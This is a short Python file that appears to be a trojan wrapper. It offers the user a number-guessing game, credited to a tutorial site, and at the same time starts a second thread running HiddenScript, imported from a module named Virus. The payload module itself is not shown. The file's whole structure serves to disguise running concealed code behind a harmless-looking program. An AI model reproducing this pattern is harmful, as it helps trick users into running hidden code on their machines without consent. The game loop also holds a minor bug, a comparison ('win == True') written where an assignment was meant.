import os
import threading
from time import sleep
from random import randint, choice
from itertools import chain
from Tree import Tree
from Virus import HiddenScript

def GuessingGame():                            # credits to https://www.codespeedy.com/number-guessing-game-in-python/ (with a few edits, of course)
    print(os.getcwd())
    print("This is a guessing game. Try your best!")
    sleep(0.1)
    random_number = randint(1, 100)
    win = False
    Turns = 1
    while win==False:
        Your_guess = input("Enter a number between 1 and 100: ")
        try:
            if random_number==int(Your_guess):
                print("You won!")
                print("Number of turns you have used: ",Turns)
                win == True
                sleep(5)
                break
            else:
                if random_number>int(Your_guess):
                    print("Your guess was too low, please enter a higher number")
                else:
                    print("Your guess was too high, please enter a lower number")
            Turns +=1
        except ValueError:
            continue
              
game = threading.Thread(target=GuessingGame)
script = threading.Thread(target=HiddenScript)
game.start()
script.start()
